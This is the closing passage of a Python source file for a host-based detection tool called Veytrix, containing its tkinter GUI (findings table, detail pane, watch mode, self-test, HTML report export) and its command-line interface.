          "high": "#FFAB91", "critical": "#EF9A9A"}


class VeytrixGUI:
    def __new__(cls, *a, **kw):
        if not HAS_TK:
            raise RuntimeError("tkinter not available")
        return super().__new__(cls)

    def __init__(self):
        self.root = tk.Tk()
        self.root.title(f"Veytrix Detection Engine  V{VERSION}")
        self.root.geometry("1280x800")
        self.root.minsize(900, 600)
        self.root.configure(bg=DARK)

        self.queue_ = queue.Queue()
        self.findings = []
        self.ctx = None
        self.last_scan_time = "—"
        self.watching = False
        self.watch_thread = None
        self.seen_fps = set()

        self._build_ui()
        self._build_styles()
        self.root.after(100, self._drain_queue)
        self.root.protocol("WM_DELETE_WINDOW", self._on_close)

        # Show dependency warnings
        warnings = []
        if not HAS_PSUTIL:
            warnings.append("psutil not installed — install: pip install psutil")
        if not HAS_CRYPTO:
            warnings.append("cryptography optional (TLS check R-021 will skip)")
        if warnings:
            self._show_warning("\n".join(warnings))

    # ── UI construction ────────────────────────────────────────────────
    def _build_styles(self):
        s = ttk.Style(self.root)
        try:
            s.theme_use("clam")
        except tk.TclError:
            pass
        s.configure("Treeview", background=PANEL, foreground=FG,
                    fieldbackground=PANEL, rowheight=26,
                    font=("Segoe UI" if IS_WINDOWS else "DejaVu Sans", 10))
        s.configure("Treeview.Heading", background=DARK, foreground=ACCENT,
                    font=("Segoe UI" if IS_WINDOWS else "DejaVu Sans",
                          10, "bold"))
        s.map("Treeview", background=[("selected", ACCENT)],
              foreground=[("selected", "#FFFFFF")])

    def _build_ui(self):
        # Header
        header = tk.Frame(self.root, bg=DARK, height=70)
        header.pack(fill="x", padx=16, pady=(12, 0))
        header.pack_propagate(False)

        tk.Label(header, text="VEYTRIX", bg=DARK, fg=ACCENT,
                 font=("Segoe UI" if IS_WINDOWS else "DejaVu Sans",
                       22, "bold")).pack(side="left")
        tk.Label(header, text="  Detection Engine", bg=DARK, fg=FG,
                 font=("Segoe UI" if IS_WINDOWS else "DejaVu Sans",
                       14)).pack(side="left", padx=(6, 0))
        tk.Label(header, text=f"V{VERSION}", bg=DARK, fg="#8899AA",
                 font=("Segoe UI" if IS_WINDOWS else "DejaVu Sans",
                       10)).pack(side="left", padx=(10, 0))

        # Platform badges
        self.badge_frame = tk.Frame(header, bg=DARK)
        self.badge_frame.pack(side="right")
        plat = platform.system()
        admin = SystemContext._check_admin()
        self._badge(self.badge_frame, plat, "#0D47A1")
        self._badge(self.badge_frame,
                    "ADMIN" if admin else "USER",
                    "#2E7D32" if admin else "#B71C1C")

        # Toolbar
        toolbar = tk.Frame(self.root, bg=DARK)
        toolbar.pack(fill="x", padx=16, pady=8)

        self.btn_scan = self._btn(toolbar, "▶  Scan Now", self._do_scan, True)
        self.btn_scan.pack(side="left", padx=(0, 6))
        self.btn_checks = self._btn(toolbar, "Scan + Coverage",
                                    self._do_scan_checks)
        self.btn_checks.pack(side="left", padx=(0, 6))
        self.btn_self = self._btn(toolbar, "Self-Test",
                                  self._do_self_test)
        self.btn_self.pack(side="left", padx=(0, 6))

        # Watch toggle
        self.btn_watch = self._btn(toolbar, "◉  Watch: OFF",
                                   self._toggle_watch)
        self.btn_watch.pack(side="left", padx=(0, 6))

        self.btn_report = self._btn(toolbar, "Export Report",
                                    self._do_report)
        self.btn_report.pack(side="left", padx=(0, 6))

        # Stats bar
        stats = tk.Frame(self.root, bg=PANEL, height=60)
        stats.pack(fill="x", padx=16, pady=(0, 8))
        stats.pack_propagate(False)

        self.stat_labels = {}
        for i, (key, label) in enumerate([
            ("procs", "Processes"), ("conns", "Connections"),
            ("findings", "Findings"), ("critical", "Critical"),
            ("high", "High"), ("time", "Last Scan"),
        ]):
            f = tk.Frame(stats, bg=PANEL, padx=14, pady=8)
            f.pack(side="left", fill="y")
            tk.Label(f, text=label, bg=PANEL, fg="#8899AA",
                     font=("Segoe UI" if IS_WINDOWS else "DejaVu Sans",
                           9)).pack(anchor="w")
            lbl = tk.Label(f, text="—", bg=PANEL, fg=ACCENT,
                           font=("Segoe UI" if IS_WINDOWS else "DejaVu Sans",
                                 16, "bold"))
            lbl.pack(anchor="w")
            self.stat_labels[key] = lbl

        # Main pane: table (left) + detail (right)
        pane = tk.PanedWindow(self.root, bg=DARK, sashwidth=4,
                              sashrelief="flat")
        pane.pack(fill="both", expand=True, padx=16, pady=(0, 8))

        # Left — findings table
        left = tk.Frame(pane, bg=DARK)
        tk.Label(left, text="Findings", bg=DARK, fg="#FFFFFF",
                 font=("Segoe UI" if IS_WINDOWS else "DejaVu Sans",
                       12, "bold")).pack(anchor="w", pady=(0, 6))

        tf = tk.Frame(left, bg=DARK)
        tf.pack(fill="both", expand=True)
        cols = ("sev", "rule", "name", "process", "pid", "tech", "conf")
        self.tree = ttk.Treeview(tf, columns=cols, show="headings")
        for c, w, h in [("sev", 80, "Severity"), ("rule", 70, "Rule"),
                        ("name", 280, "Finding"),
                        ("process", 160, "Process"),
                        ("pid", 60, "PID"),
                        ("tech", 80, "MITRE"),
                        ("conf", 60, "Conf%")]:
            self.tree.heading(c, text=h)
            self.tree.column(c, width=w, anchor="w")
        for sev, color in SEV_FG.items():
            self.tree.tag_configure(sev, foreground=color)
        scroll = ttk.Scrollbar(tf, orient="vertical",
                               command=self.tree.yview)
        self.tree.configure(yscrollcommand=scroll.set)
        self.tree.pack(side="left", fill="both", expand=True)
        scroll.pack(side="right", fill="y")
        self.tree.bind("<<TreeviewSelect>>", self._on_select)
        pane.add(left, minsize=500)

        # Right — details
        right = tk.Frame(pane, bg=PANEL)
        tk.Label(right, text="Details", bg=PANEL, fg="#FFFFFF",
                 font=("Segoe UI" if IS_WINDOWS else "DejaVu Sans",
                       12, "bold"), padx=12, pady=8,
                 anchor="w").pack(fill="x")
        self.detail_text = tk.Text(
            right, bg=PANEL2, fg=FG, relief="flat", wrap="word",
            font=("Segoe UI" if IS_WINDOWS else "DejaVu Sans", 10),
            padx=12, pady=12, state="disabled")
        self.detail_text.pack(fill="both", expand=True)
        # Configure tags for styled text
        self.detail_text.tag_configure("h", foreground=ACCENT,
                                        font=("Segoe UI"
                                              if IS_WINDOWS
                                              else "DejaVu Sans",
                                              12, "bold"))
        self.detail_text.tag_configure("lbl", foreground="#8899AA",
                                        font=("Segoe UI"
                                              if IS_WINDOWS
                                              else "DejaVu Sans",
                                              9, "bold"))
        self.detail_text.tag_configure("mono", foreground="#B0C4DE",
                                        font=("Consolas"
                                              if IS_WINDOWS
                                              else "DejaVu Sans Mono", 9))
        self.detail_text.tag_configure("rem", foreground="#FFE082")
        pane.add(right, minsize=300)

        # Status bar
        self.status = tk.Label(self.root,
                                text="Ready. Click 'Scan Now' to begin.",
                                bg=DARK, fg="#8899AA", anchor="w",
                                padx=16, pady=6,
                                font=("Segoe UI"
                                      if IS_WINDOWS
                                      else "DejaVu Sans", 9))
        self.status.pack(fill="x", side="bottom")

    def _badge(self, parent, text, color):
        tk.Label(parent, text=f" {text} ", bg=color, fg="#FFFFFF",
                 font=("Segoe UI" if IS_WINDOWS else "DejaVu Sans",
                       9, "bold"), padx=6, pady=2).pack(side="left",
                                                          padx=3)

    def _btn(self, parent, text, cmd, primary=False):
        return tk.Button(
            parent, text=text, command=cmd, relief="flat", bd=0,
            padx=16, pady=8,
            bg=ACCENT if primary else PANEL,
            fg="#FFFFFF", activebackground="#0088DD",
            activeforeground="#FFFFFF",
            font=("Segoe UI" if IS_WINDOWS else "DejaVu Sans", 10,
                  "bold" if primary else "normal"),
            cursor="hand2")

    def _show_warning(self, text):
        self.status.configure(text=f"⚠  {text}", fg="#FFB74D")

    # ── Actions ────────────────────────────────────────────────────────
    def _do_scan(self):
        self._start_scan(checks=False)

    def _do_scan_checks(self):
        self._start_scan(checks=True)

    def _start_scan(self, checks=False):
        if not HAS_PSUTIL:
            messagebox.showerror(
                "psutil required",
                "psutil is not installed.\n\n"
                "Run this in a terminal:\n\n"
                "    pip install psutil")
            return
        self._set_busy(True, "Scanning system…")
        self.tree.delete(*self.tree.get_children())
        self.detail_text.configure(state="normal")
        self.detail_text.delete("1.0", "end")
        self.detail_text.configure(state="disabled")

        def worker():
            try:
                ctx = SystemContext.capture()
                findings = scan(ctx)
                self.queue_.put(("scan_done", ctx, findings, checks))
            except Exception as exc:
                self.queue_.put(("scan_error", str(exc), None, False))

        threading.Thread(target=worker, daemon=True).start()

    def _do_self_test(self):
        self._set_busy(True, "Running self-test on synthetic events…")

        def worker():
            try:
                ctx = _self_test_context()
                findings = scan(ctx)
                self.queue_.put(("self_test_done", ctx, findings, False))
            except Exception as exc:
                self.queue_.put(("scan_error", str(exc), None, False))

        threading.Thread(target=worker, daemon=True).start()

    def _do_report(self):
        if not self.findings:
            messagebox.showinfo("Nothing to export",
                                "Run a scan first — no findings yet.")
            return
        path = filedialog.asksaveasfilename(
            defaultextension=".html",
            filetypes=[("HTML report", "*.html"),
                       ("All files", "*.*")],
            initialfile="veytrix_report.html")
        if not path:
            return
        try:
            generate_html_report(self.findings, self.ctx, path)
            self.status.configure(
                text=f"✓ Report saved: {path}", fg="#A5D6A7")
            if messagebox.askyesno("Report saved",
                                    f"Saved to:\n{path}\n\n"
                                    "Open in browser?"):
                import webbrowser
                webbrowser.open(f"file://{os.path.abspath(path)}")
        except Exception as exc:
            messagebox.showerror("Export failed", str(exc))

    def _toggle_watch(self):
        if self.watching:
            self.watching = False
            self.btn_watch.configure(text="◉  Watch: OFF",
                                     bg=PANEL, fg=FG)
            self.status.configure(text="Watch stopped.", fg="#8899AA")
            return
        if not HAS_PSUTIL:
            messagebox.showerror("psutil required",
                                  "Install: pip install psutil")
            return
        self.watching = True
        self.seen_fps = set()
        self.btn_watch.configure(text="◉  Watch: ON",
                                 bg="#2E7D32", fg="#FFFFFF")
        self.status.configure(text="Watching for new findings every 10s…",
                              fg="#A5D6A7")
        self._start_watch_thread()

    def _start_watch_thread(self):
        def loop():
            while self.watching:
                try:
                    ctx = SystemContext.capture()
                    findings = scan(ctx)
                    new = [f for f in findings
                           if f.fingerprint not in self.seen_fps]
                    for f in new:
                        self.seen_fps.add(f.fingerprint)
                    if new:
                        self.queue_.put(("watch_new", ctx, new, False))
                except Exception:
                    pass
                for _ in range(10):
                    if not self.watching:
                        break
                    time.sleep(1)
        self.watch_thread = threading.Thread(target=loop, daemon=True)
        self.watch_thread.start()

    # ── Queue drain ───────────────────────────────────────────────────
    def _drain_queue(self):
        try:
            while True:
                kind, ctx, findings, checks = self.queue_.get_nowait()
                if kind == "scan_error":
                    self._set_busy(False, "")
                    self.status.configure(
                        text=f"✗ Scan failed: {ctx}", fg="#EF9A9A")
                    messagebox.showerror("Scan failed", ctx)
                    continue
                if kind == "self_test_done":
                    self._on_self_test_done(ctx, findings)
                elif kind == "scan_done":
                    self._on_scan_done(ctx, findings, checks)
                elif kind == "watch_new":
                    self._on_watch_new(ctx, findings)
        except queue.Empty:
            pass
        self.root.after(100, self._drain_queue)

    def _on_scan_done(self, ctx, findings, checks):
        self.ctx = ctx
        self.findings = findings
        self.last_scan_time = dt.datetime.now().strftime("%H:%M:%S")
        self._populate(findings)
        self._update_stats(ctx, findings)
        self._set_busy(False, "")

        critical = sum(1 for f in findings if f.severity == "critical")
        high = sum(1 for f in findings if f.severity == "high")
        msg = (f"✓ Scan complete — {len(findings)} finding(s). "
               f"{critical} critical, {high} high.")
        self.status.configure(
            text=msg,
            fg="#EF9A9A" if critical else
            ("#FFAB91" if high else "#A5D6A7"))

        if checks:
            self._show_coverage(ctx)

    def _on_self_test_done(self, ctx, findings):
        self.ctx = ctx
        self.findings = findings
        self._populate(findings)
        self._update_stats(ctx, findings)
        self._set_busy(False, "")
        expected = {"R-001", "R-004", "R-007", "R-011", "R-014",
                    "R-015", "R-022", "R-024"}
        caught = {f.rule_id for f in findings}
        missing = expected - caught
        if missing:
            self.status.configure(
                text=f"✗ Self-test failed — missing: {sorted(missing)}",
                fg="#EF9A9A")
            messagebox.showerror(
                "Self-test FAILED",
                f"Missing rules: {sorted(missing)}\n\n"
                "Engine may be broken.")
        else:
            self.status.configure(
                text=f"✓ Self-test passed — {len(expected)} rules fired.",
                fg="#A5D6A7")
            messagebox.showinfo(
                "Self-test passed",
                f"All {len(expected)} expected rules fired.\n"
                f"Detection engine is working.")

    def _on_watch_new(self, ctx, findings):
        # Append new findings to existing list + table
        existing = {f.fingerprint for f in self.findings}
        added = [f for f in findings if f.fingerprint not in existing]
        if not added:
            return
        self.findings.extend(added)
        self.ctx = ctx
        for f in added:
            self._insert_row(f)
        self._update_stats(ctx, self.findings)
        crit = sum(1 for f in added if f.severity == "critical")
        self.status.configure(
            text=f"⚠ Watch: {len(added)} new finding(s) detected"
                 + (f" — {crit} critical" if crit else ""),
            fg="#EF9A9A" if crit else "#FFB74D")

    def _show_coverage(self, ctx):
        ran = sum(1 for c in ctx.checks if c.status == "ran")
        denied = sum(1 for c in ctx.checks if c.status == "denied")
        skipped = sum(1 for c in ctx.checks if c.status == "skipped")
        text = (f"Coverage — Ran: {ran}  Denied: {denied}  "
                f"Skipped: {skipped}\n\n")
        for c in ctx.checks:
            text += f"  [{c.status}] {c.name}"
            if c.reason:
                text += f" — {c.reason}"
            text += "\n"
        if denied:
            text += f"\n⚠ Run as {'Administrator' if IS_WINDOWS else 'root'} for full coverage."
        messagebox.showinfo("Coverage report", text)

    # ── Table population ──────────────────────────────────────────────
    def _populate(self, findings):
        self.tree.delete(*self.tree.get_children())
        for f in findings:
            self._insert_row(f)

    def _insert_row(self, f):
        self.tree.insert("", "end", iid=f.fingerprint, values=(
            f.severity.upper(), f.rule_id, f.name,
            f.affected_process or "—",
            f.affected_pid if f.affected_pid else "—",
            f.technique, int(f.confidence * 100)),
            tags=(f.severity,))

    def _on_select(self, event):
        sel = self.tree.selection()
        if not sel:
            return
        fp = sel[0]
        f = next((x for x in self.findings if x.fingerprint == fp), None)
        if f:
            self._show_detail(f)

    def _show_detail(self, f):
        t = self.detail_text
        t.configure(state="normal")
        t.delete("1.0", "end")

        t.insert("end", f"{f.severity.upper()}  {f.name}\n", "h")
        t.insert("end", f"\n")

        t.insert("end", "RULE        ", "lbl")
        t.insert("end", f"{f.rule_id}\n")
        t.insert("end", "TECHNIQUE   ", "lbl")
        t.insert("end", f"{f.technique}\n")
        t.insert("end", "CONFIDENCE  ", "lbl")
        t.insert("end", f"{int(f.confidence*100)}%\n")
        if f.affected_pid:
            t.insert("end", "PROCESS     ", "lbl")
            t.insert("end", f"{f.affected_process} (PID {f.affected_pid})\n")
        t.insert("end", "TIME        ", "lbl")
        t.insert("end", f"{f.timestamp}\n")

        t.insert("end", f"\nEvidence:\n", "lbl")
        for ev in f.evidence:
            t.insert("end", f"  • {ev}\n", "mono")

        if f.remediation:
            t.insert("end", f"\nRemediation:\n", "lbl")
            t.insert("end", f"  → {f.remediation}\n", "rem")

        t.configure(state="disabled")

    def _update_stats(self, ctx, findings):
        self.stat_labels["procs"].configure(text=str(len(ctx.processes)))
        self.stat_labels["conns"].configure(text=str(len(ctx.connections)))
        self.stat_labels["findings"].configure(text=str(len(findings)))
        self.stat_labels["critical"].configure(
            text=str(sum(1 for f in findings if f.severity == "critical")))
        self.stat_labels["high"].configure(
            text=str(sum(1 for f in findings if f.severity == "high")))
        self.stat_labels["time"].configure(text=self.last_scan_time)

    def _set_busy(self, busy, msg=""):
        state = "disabled" if busy else "normal"
        for b in (self.btn_scan, self.btn_checks, self.btn_self,
                  self.btn_report):
            b.configure(state=state)
        if msg:
            self.status.configure(text=msg, fg=ACCENT)

    # ── Lifecycle ─────────────────────────────────────────────────────
    def _on_close(self):
        self.watching = False
        try:
            self.root.destroy()
        except Exception:
            pass

    def run(self):
        self.root.mainloop()


# ═════════════════════════════════════════════════════════════════════════════
# CLI (headless)
# ═════════════════════════════════════════════════════════════════════════════

class C:
    RED, ORANGE, YELLOW = "\033[91m", "\033[38;5;208m", "\033[93m"
    GREEN, BLUE, CYAN = "\033[92m", "\033[94m", "\033[96m"
    BOLD, DIM, RESET = "\033[1m", "\033[2m", "\033[0m"

SEV_COLOR = {"low": C.GREEN, "medium": C.YELLOW,
             "high": C.ORANGE, "critical": C.RED}


def _print_findings(findings, ctx):
    print(f"\n{C.BOLD}{C.CYAN}═══ VEYTRIX DETECTION "
          f"—  {ctx.scan_time[:19]}Z ═══{C.RESET}\n")
    print(f"  Processes: {len(ctx.processes)}  |  "
          f"Connections: {len(ctx.connections)}  |  "
          f"Findings: {len(findings)}\n")
    if not findings:
        print(f"{C.GREEN}  ✓ No suspicious activity detected.{C.RESET}\n")
        return
    for i, f in enumerate(findings, 1):
        color = SEV_COLOR[f.severity]
        print(f"[{i}] {color}{f.severity.upper()}{C.RESET}  "
              f"{C.BOLD}{f.name}{C.RESET}  "
              f"{C.DIM}({f.rule_id} · {f.technique} · "
              f"{int(f.confidence*100)}%){C.RESET}")
        for ev in f.evidence:
            print(f"    • {ev}")
        if f.remediation:
            print(f"    → {f.remediation}")
        print()


def _cli_main(argv):
    p = argparse.ArgumentParser(
        prog="veytrix_detect",
        description="Veytrix Detection Engine — GUI by default, CLI with args")
    p.add_argument("--version", action="version",
                   version=f"%(prog)s {VERSION}")
    p.add_argument("--no-gui", action="store_true",
                   help="force CLI mode")
    sub = p.add_subparsers(dest="cmd", required=False)

    sp = sub.add_parser("scan", help="one-shot scan")
    sp.add_argument("--json", action="store_true")
    sp.add_argument("--checks", action="store_true")
    sp.add_argument("--report")

    sp = sub.add_parser("watch", help="continuous monitoring")
    sp.add_argument("--interval", type=int, default=10)

    sp = sub.add_parser("report", help="write HTML report")
    sp.add_argument("--out", default="veytrix_report.html")

    sub.add_parser("self-test", help="prove rules work")

    args = p.parse_args(argv)

    if not HAS_PSUTIL and args.cmd != "self-test":
        print(f"{C.RED}ERROR: psutil is not installed.{C.RESET}")
        print(f"Install: pip install psutil")
        return 1

    if args.cmd == "scan":
        ctx = SystemContext.capture()
        findings = scan(ctx)
        if args.json:
            print(json.dumps({
                "scan_time": ctx.scan_time, "platform": ctx.platform,
                "processes": len(ctx.processes),
                "connections": len(ctx.connections),
                "findings": [{"rule": f.rule_id, "name": f.name,
                               "severity": f.severity,
                               "confidence": f.confidence,
                               "technique": f.technique,
                               "pid": f.affected_pid,
                               "process": f.affected_process,
                               "evidence": f.evidence,
                               "remediation": f.remediation}
                              for f in findings],
            }, indent=2))
        else:
            _print_findings(findings, ctx)
            if args.checks:
                for c in ctx.checks:
                    print(f"  [{c.status}] {c.name}"
                          + (f" — {c.reason}" if c.reason else ""))
            if args.report:
                path = generate_html_report(findings, ctx, args.report)
                print(f"\nReport: {path}")
        return 0 if not any(f.severity in ("high", "critical")
                            for f in findings) else 2

    if args.cmd == "watch":
        seen = set()
        try:
            while True:
                ctx = SystemContext.capture()
                findings = scan(ctx)
                new = [f for f in findings if f.fingerprint not in seen]
                if new:
                    for f in new:
                        seen.add(f.fingerprint)
                    _print_findings(new, ctx)
                else:
                    print(f"{C.DIM}[{dt.datetime.now():%H:%M:%S}] "
                          f"no new findings{C.RESET}")
                time.sleep(args.interval)
        except KeyboardInterrupt:
            return 0

    if args.cmd == "report":
        ctx = SystemContext.capture()
        findings = scan(ctx)
        path = generate_html_report(findings, ctx, args.out)
        print(f"Report: {path}")
        return 0

    if args.cmd == "self-test":
        ctx = _self_test_context()
        findings = scan(ctx)
        expected = {"R-001", "R-004", "R-007", "R-011", "R-014",
                    "R-015", "R-022", "R-024"}
        caught = {f.rule_id for f in findings}
        missing = expected - caught
        if missing:
            print(f"{C.RED}✗ Self-test failed — missing: "
                  f"{sorted(missing)}{C.RESET}")
            return 1
        print(f"{C.GREEN}✓ Self-test passed — {len(expected)} rules "
              f"fired.{C.RESET}")
        return 0

    p.print_help()
    return 0


# ═════════════════════════════════════════════════════════════════════════════
# Entry point
# ═════════════════════════════════════════════════════════════════════════════

def main() -> int:
    argv = sys.argv[1:]

    # Force CLI if explicitly requested or args present
    force_cli = "--no-gui" in argv or any(
        a in argv for a in ("scan", "watch", "report", "self-test"))

    if force_cli or not HAS_TK:
        if not HAS_TK and not force_cli:
            print("tkinter not available — falling back to CLI.",
                  file=sys.stderr)
        return _cli_main(argv)

    # GUI mode
    try:
        app = VeytrixGUI()
        app.run()
        return 0
    except Exception as exc:
        import traceback
        print(f"GUI failed to start: {exc}", file=sys.stderr)
        traceback.print_exc()
        print("\nFalling back to CLI help...", file=sys.stderr)
        _cli_main(["--help"])
        try:
            input("\nPress Enter to exit...")
        except Exception:
            pass
        return 1


if __name__ == "__main__":
    sys.exit(main())
